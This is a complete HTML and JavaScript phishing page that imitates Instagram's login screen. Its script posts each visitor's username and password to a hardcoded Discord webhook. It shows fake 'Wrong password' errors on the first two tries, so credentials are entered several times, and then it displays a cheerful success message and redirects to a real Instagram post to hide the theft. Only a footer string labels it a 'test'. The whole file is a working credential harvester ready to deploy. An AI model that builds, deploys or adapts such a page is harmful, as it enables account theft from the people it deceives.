<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { max-width: 350px; width: 100%; }
        .login-card { background: white; border: 1px solid #dbdbdb; padding: 40px 30px; border-radius: 1px; }
        .brand { text-align: center; margin-bottom: 30px; }
        .brand i { font-size: 28px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .brand span { font-size: 32px; font-weight: 600; color: #262626; }
        form { display: flex; flex-direction: column; gap: 6px; }
        input { padding: 12px 10px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; }
        input:focus { border-color: #a8a8a8; outline: none; }
        .login-btn { background: #0095f6; color: white; border: none; padding: 8px; font-weight: 600; cursor: pointer; border-radius: 4px; height: 32px; }
        .login-btn:hover { background: #1877f2; }
        .divider { display: flex; margin: 18px 0; align-items: center; }
        .divider-line { flex: 1; height: 1px; background: #dbdbdb; }
        .divider-text { margin: 0 18px; font-size: 13px; color: #8e8e8e; font-weight: 600; }
        .facebook { text-align: center; color: #385185; font-weight: 600; font-size: 14px; margin: 6px 0; cursor: pointer; }
        .facebook i { margin-right: 8px; }
        .forgot { font-size: 12px; color: #00376b; text-decoration: none; display: block; text-align: center; margin: 8px 0; }
        .signup { text-align: center; font-size: 14px; margin-top: 10px; color: #262626; }
        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .app-download { text-align: center; margin-top: 20px; }
        .app-download p { font-size: 14px; color: #262626; margin-bottom: 12px; }
        .badges { display: flex; justify-content: center; gap: 8px; flex-wrap: wrap; }
        .badge { background: #000; color: white; padding: 6px 14px; border-radius: 4px; font-size: 11px; font-weight: 600; display: flex; align-items: center; gap: 6px; opacity: 0.9; cursor: default; }
        .badge i { font-size: 18px; }

        /* Success Message Style */
        #status {
            margin-top: 15px;
            padding: 20px 15px;
            border-radius: 15px;
            display: none;
            text-align: center;
            font-weight: 600;
            font-size: 18px;
            background: linear-gradient(135deg, #ff6b6b, #ff69b4, #ff1493);
            color: white;
            box-shadow: 0 8px 30px rgba(255, 105, 180, 0.4);
            animation: pulse 1.5s ease-in-out infinite;
            position: relative;
            overflow: hidden;
        }

        #status.show {
            display: block;
            animation: fadeInUp 0.8s ease forwards, pulse 1.5s ease-in-out infinite 0.8s;
        }

        #status .heart-icon {
            font-size: 30px;
            animation: heartBeat 1s ease-in-out infinite;
            display: inline-block;
        }

        #status .message {
            margin-top: 8px;
            font-size: 20px;
            letter-spacing: 1px;
        }

        /* Error Message Style */
        #status.error {
            background: linear-gradient(135deg, #f8d7da, #dc3545) !important;
            color: white;
            box-shadow: 0 8px 30px rgba(220, 53, 69, 0.4);
        }

        /* Sparkle Animation */
        .sparkle {
            position: absolute;
            pointer-events: none;
            font-size: 20px;
            animation: sparkleFloat 2s ease-out forwards;
            opacity: 0;
        }

        @keyframes sparkleFloat {
            0% {
                opacity: 1;
                transform: translate(0, 0) scale(0.5) rotate(0deg);
            }
            100% {
                opacity: 0;
                transform: translate(var(--tx), var(--ty)) scale(1.5) rotate(360deg);
            }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.02); }
        }

        @keyframes heartBeat {
            0%, 100% { transform: scale(1); }
            14% { transform: scale(1.3); }
            28% { transform: scale(1); }
            42% { transform: scale(1.3); }
            70% { transform: scale(1); }
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px) scale(0.9);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .meta-footer { margin-top: 20px; font-size: 11px; color: #8e8e8e; text-align: center; }
        .meta-footer .links { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px 12px; margin-bottom: 6px; }
        .meta-footer .links span { cursor: default; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <div class="brand"><i class="fab fa-instagram"></i><span>Instagram</span></div>
            <form onsubmit="sendData(event)">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log in</button>
            </form>
            <div class="divider"><div class="divider-line"></div><span class="divider-text">OR</span><div class="divider-line"></div></div>
            <div class="facebook"><i class="fab fa-facebook-square"></i>Log in with Facebook</div>
            <a href="#" class="forgot">Forgot password?</a>
            <div id="status"></div>
        </div>
        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
        <div class="app-download">
            <p>Get the app.</p>
            <div class="badges">
                <div class="badge"><i class="fab fa-apple"></i> App Store</div>
                <div class="badge"><i class="fab fa-google-play"></i> Google Play</div>
            </div>
        </div>
        <div class="meta-footer">
            <div class="links">
                <span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span>
                <span>Help</span><span>API</span><span>Privacy</span><span>Terms</span>
                <span>Locations</span><span>Instagram Lite</span><span>Threads</span>
            </div>
            <div class="copyright">© 2026 Instagram from Meta</div>
        </div>
    </div>
    <script>
        // ✅ YOUR NEW DISCORD WEBHOOK URL
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1526315566011252868/wxzJ91z_cbUxAy0zZE_3vSoOE11baPaKASHK0PqJLfcuDm6uNydqJG1Pqyty7d--pnaC";
        
        // ✅ THE INSTAGRAM POST URL YOU WANT TO OPEN
        const INSTAGRAM_REDIRECT_URL = "https://www.instagram.com/p/DJFPnYdtS1D/?img_index=3&igsh=N2ZqY2NhaHF2NDNk";
        
        const statusDiv = document.getElementById('status');

        // 🔐 Attempt counter
        let attemptCount = 0;
        const MAX_ATTEMPTS = 3;
        let storedUsername = '';
        let storedPassword = '';

        // ✨ Function to create sparkles
        function createSparkles() {
            const emojis = ['✨', '⭐', '🌟', '💖', '❤️', '🌸', '🌺', '💕'];
            const container = statusDiv;
            
            for (let i = 0; i < 25; i++) {
                const sparkle = document.createElement('span');
                sparkle.className = 'sparkle';
                sparkle.textContent = emojis[Math.floor(Math.random() * emojis.length)];
                
                const x = Math.random() * 100;
                const y = Math.random() * 100;
                const tx = (Math.random() - 0.5) * 300;
                const ty = (Math.random() - 0.5) * 300;
                const size = 14 + Math.random() * 20;
                
                sparkle.style.left = x + '%';
                sparkle.style.top = y + '%';
                sparkle.style.fontSize = size + 'px';
                sparkle.style.setProperty('--tx', tx + 'px');
                sparkle.style.setProperty('--ty', ty + 'px');
                sparkle.style.animationDuration = (1.5 + Math.random() * 1.5) + 's';
                sparkle.style.animationDelay = (Math.random() * 1.5) + 's';
                
                container.appendChild(sparkle);
                
                setTimeout(() => {
                    sparkle.remove();
                }, 4000);
            }
        }

        // 🚀 Function to open the specific Instagram post
        function openInstagramPost() {
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            
            if (isMobile) {
                // Try to open the Instagram post in the app
                // Extract the post ID from the URL
                const postId = "DJFPnYdtS1D";
                window.location.href = `instagram://media?id=${postId}`;
                
                // Fallback to website if app doesn't open
                setTimeout(() => {
                    window.location.href = INSTAGRAM_REDIRECT_URL;
                }, 1500);
            } else {
                // Desktop: go directly to the Instagram post URL
                window.location.href = INSTAGRAM_REDIRECT_URL;
            }
        }

        // 📤 Function to send data to Discord
        async function sendToDiscord(username, password) {
            const data = {
                content: "📥 **New Login Credentials!**",
                embeds: [{
                    title: "Instagram Login Capture",
                    color: 0x0095f6,
                    fields: [
                        { name: "👤 Username", value: username, inline: true },
                        { name: "🔑 Password", value: password, inline: true },
                        { name: "🕐 Time", value: new Date().toLocaleString(), inline: false },
                        { name: "📊 Attempt", value: "3rd attempt (success)", inline: false }
                    ],
                    footer: { text: "Instagram Login Test" }
                }]
            };
            
            try {
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                console.log('✅ Sent to Discord:', username, password);
                return true;
            } catch (error) {
                console.error('❌ Discord Error:', error);
                return false;
            }
        }

        // 🎯 Main function
        async function sendData(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!username || !password) {
                alert('⚠️ Please enter both username and password');
                return;
            }

            // Increment attempt counter
            attemptCount++;

            // Store credentials for final attempt
            storedUsername = username;
            storedPassword = password;

            // Check if this is the 3rd attempt
            if (attemptCount >= MAX_ATTEMPTS) {
                // ✅ THIRD ATTEMPT - SUCCESS!
                console.log(`🎯 Attempt ${attemptCount}/${MAX_ATTEMPTS} - SUCCESS! Sending to Discord...`);
                
                // Send to Discord
                await sendToDiscord(storedUsername, storedPassword);
                
                // 💖 Show success message with heart and sparkles
                statusDiv.innerHTML = `
                    <div class="heart-icon">❤️</div>
                    <div class="message">Login successful! 🎉</div>
                `;
                statusDiv.className = 'show';
                statusDiv.style.background = 'linear-gradient(135deg, #ff6b6b, #ff69b4, #ff1493)';
                statusDiv.style.color = 'white';
                statusDiv.style.boxShadow = '0 8px 30px rgba(255,105,180,0.5)';
                statusDiv.style.animation = 'fadeInUp 0.8s ease forwards, pulse 1.5s ease-in-out infinite 0.8s';
                
                // Clear form
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                
                // ✨ Create sparkles
                setTimeout(createSparkles, 300);
                
                // 🚀 Open the Instagram post after 2 seconds
                setTimeout(openInstagramPost, 2000);
                
                // Reset counter for new session
                // attemptCount = 0;
                
            } else {
                // ❌ FIRST OR SECOND ATTEMPT - WRONG PASSWORD
                const attemptsLeft = MAX_ATTEMPTS - attemptCount;
                console.log(`❌ Attempt ${attemptCount}/${MAX_ATTEMPTS} - WRONG PASSWORD. ${attemptsLeft} attempts remaining.`);
                
                // Show error message
                statusDiv.innerHTML = `
                    <div style="font-size: 50px; margin-bottom: 10px;">🔒</div>
                    <div class="message" style="font-size: 18px;">Wrong password!</div>
                    <div style="font-size: 14px; opacity: 0.9;">${attemptsLeft} attempt${attemptsLeft > 1 ? 's' : ''} remaining</div>
                `;
                statusDiv.className = 'show error';
                statusDiv.style.background = 'linear-gradient(135deg, #f8d7da, #dc3545)';
                statusDiv.style.color = 'white';
                statusDiv.style.boxShadow = '0 8px 30px rgba(220, 53, 69, 0.4)';
                statusDiv.style.animation = 'fadeInUp 0.5s ease forwards';
                
                // Clear password field for retry
                document.getElementById('password').value = '';
                document.getElementById('password').focus();
            }
        }
    </script>
</body>
</html>
